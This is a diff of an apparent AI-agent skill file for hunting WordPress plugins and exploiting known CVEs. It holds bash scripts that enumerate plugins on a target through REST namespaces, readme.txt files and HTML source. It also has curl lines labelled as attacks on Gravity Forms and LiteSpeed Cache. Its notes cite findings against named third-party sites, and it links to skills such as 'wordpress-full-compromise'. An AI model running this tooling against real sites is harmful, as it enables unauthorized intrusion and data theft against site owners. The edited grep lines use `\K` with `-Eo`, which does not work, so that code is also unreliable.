@@ -1,22 +1,20 @@
 ---
 name: wordpress-plugin-hunt
 description: Hunt WP plugins via REST, exploit CVEs when version known.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, wordpress, plugins, CVE, exploitation]
-    category: recon
-    related_skills:
-      - wp-mass-recon
-      - deep-invade
-      - cross-attack-chains
-      - wordpress-full-compromise
-      - staging-subdomain-hunt
-      - xmlrpc-exploitation
+compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
+tags: [recon, wordpress, plugins, CVE, exploitation]
+category: recon
+related_skills:
+  - wp-mass-recon
+  - deep-invade
+  - cross-attack-chains
+  - wordpress-full-compromise
+  - staging-subdomain-hunt
+  - xmlrpc-exploitation
 ---
 
 # WordPress Plugin Hunt Skill
@@ -32,7 +30,7 @@ Discover installed WordPress plugins through REST API namespace probing, readme.
 
 ## Prerequisites
 
-- `terminal` tool with curl, python3.
+- `terminal` with curl, python3.
 - WordPress target confirmed (`/wp-json/` or `/wp-login.php` accessible).
 - For CVE exploitation: knowledge of specific CVE PoCs (reference `security-arsenal` skill).
 
@@ -44,7 +42,7 @@ TARGET="example.com"
 for ns in "revslider/v1" "elementskit/v1" "elementor/v1" "gf/v2" "wc/v3" \
   "jetpack/v4" "litespeed/v1" "yoast/v1" "acf/v3" "contact-form-7/v1" \
   "solidwp-mail/v1" "wpsl/v1" "redirection/v1" "rankmath/v1"; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET/wp-json/$ns")
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET/wp-json/$ns")
   [[ "$code" != "404" ]] && echo "FOUND: /wp-json/$ns (HTTP $code)"
 done
 ```
@@ -81,7 +79,7 @@ done
 
 ```bash
 TARGET="$1"
-OUTDIR="/root/output/plugins/$TARGET"
+OUTDIR="$OUTDIR/plugins/$TARGET"
 mkdir -p "$OUTDIR"
 
 # Comprehensive plugin namespace list
@@ -134,7 +132,7 @@ echo ""
 
 for plugin in "${!PLUGIN_NAMESPACES[@]}"; do
   ns="${PLUGIN_NAMESPACES[$plugin]}"
-  resp=$(curl -sk --max-time 5 -o /tmp/plugin_check_$$.tmp -w "%{http_code}" "https://$TARGET/wp-json/$ns" 2>/dev/null)
+  resp=$(curl -sk --max-time 5 --connect-timeout 5 -o /tmp/plugin_check_$$.tmp -w "%{http_code}" "https://$TARGET/wp-json/$ns" 2>/dev/null)
 
   if [[ "$resp" == "200" ]]; then
     size=$(wc -c < /tmp/plugin_check_$$.tmp)
@@ -157,7 +155,7 @@ rm -f /tmp/plugin_check_$$.tmp
 
 ```bash
 TARGET="$1"
-OUTDIR="/root/output/plugins/$TARGET"
+OUTDIR="$OUTDIR/plugins/$TARGET"
 
 # Common plugin slugs to check
 SLUGS=(
@@ -183,7 +181,7 @@ echo "[*] Checking readme.txt for ${#SLUGS[@]} plugins..."
 echo ""
 
 for slug in "${SLUGS[@]}"; do
-  readme=$(curl -sk --max-time 5 "https://$TARGET/wp-content/plugins/$slug/readme.txt" 2>/dev/null)
+  readme=$(curl -sk --max-time 5 --connect-timeout 5 "https://$TARGET/wp-content/plugins/$slug/readme.txt" 2>/dev/null)
 
   if [[ -n "$readme" ]]; then
     version=$(echo "$readme" | grep -i "stable tag:" | sed 's/.*: //' | tr -d '\r' | head -1)
@@ -219,11 +217,11 @@ TARGET="$1"
 
 echo "[*] Scanning HTML source for plugin fingerprints..."
 
-PAGE=$(curl -sk --max-time 10 "https://$TARGET/" 2>/dev/null)
+PAGE=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/" 2>/dev/null)
 
 # CSS/JS handles
-echo "$PAGE" | grep -oP "(?:/wp-content/plugins/|/wp-content/themes/)[a-zA-Z0-9_-]+" | sort -u | while read -r path; do
-  plugin=$(echo "$path" | grep -oP 'plugins/\K[a-zA-Z0-9_-]+|themes/\K[a-zA-Z0-9_-]+')
+echo "$PAGE" | grep -Eo "(?:/wp-content/plugins/|/wp-content/themes/)[a-zA-Z0-9_-]+" | sort -u | while read -r path; do
+  plugin=$(echo "$path" | grep -Eo 'plugins/\K[a-zA-Z0-9_-]+|themes/\K[a-zA-Z0-9_-]+')
   echo "  [SOURCE] $plugin (found in HTML)"
 done
 
@@ -268,12 +266,12 @@ TARGET="$1"
 # Gravity Forms CVE-2024-6115 (auth bypass)
 # Requires: gravityforms < 2.8.2
 # Attack: Unauthenticated access to form entries via REST API
-curl -sk "https://$TARGET/wp-json/gf/v2/forms" 2>/dev/null | python3 -m json.tool | head -20
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/gf/v2/forms" 2>/dev/null | python3 -m json.tool | head -20
 
 # LiteSpeed Cache CVE-2024-50550 (privilege escalation)
 # Requires: litespeed < 6.5.0
 # Attack: Crawler token manipulation to gain admin access
-curl -sk "https://$TARGET/wp-json/litespeed/v1/token" 2>/dev/null
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/litespeed/v1/token" 2>/dev/null
 ```
 
 ## Pitfalls
@@ -281,9 +279,9 @@ curl -sk "https://$TARGET/wp-json/litespeed/v1/token" 2>/dev/null
 - **REST namespace 200 ≠ plugin present.** Some themes and security plugins return 200 for all `/wp-json/` paths. Verify response content has actual plugin data (JSON with `id`, `name`, or `slug` fields).
 - **readme.txt blocked on many hosts.** WP Engine, Hostinger, and Cloudflare often block `readme.txt` at the CDN level. Fall back to REST namespaces or HTML source grep.
 - **Custom plugin slugs.** Premium plugins may have custom directory names. `gravityforms` may be `gravityforms-clientsite`. Check HTML source for actual slugs via `wp-content/plugins/` paths.
-- **SliderRev v1 endpoints 404 on 6.x.** Slider Revolution renamed its REST endpoints — toolking.com confirmed that ALL v1 paths return 404 while the plugin is still active. Probe non-v1 paths too: `/wp-json/sliderrevolution/sliders/`.
+- **SliderRev v1 endpoints 404 on 6.x.** Slider Revolution renamed its REST endpoints —tools-retailer.com confirmed that ALL v1 paths return 404 while the plugin is still active. Probe non-v1 paths too: `/wp-json/sliderrevolution/sliders/`.
 - **Plugin version comparison needs semantic versioning.** Bash string comparison (`<`) fails on `10.x` vs `2.x`. Use `sort -V` or python for complex comparisons.
-- **Elementor 500 leak = info disclosure.** `/wp-json/elementor/v1/favorites` returning HTTP 500 with stack trace (Wave8, toolking.com) reveals server paths and internal structure even without plugin exploitation.
+- **Elementor 500 leak = info disclosure.** `/wp-json/elementor/v1/favorites` returning HTTP 500 with stack trace (Wave8,tools-retailer.com) reveals server paths and internal structure even without plugin exploitation.
 
 ## Hosting Provider Pattern (P-23 — critical for plugin detection)
 
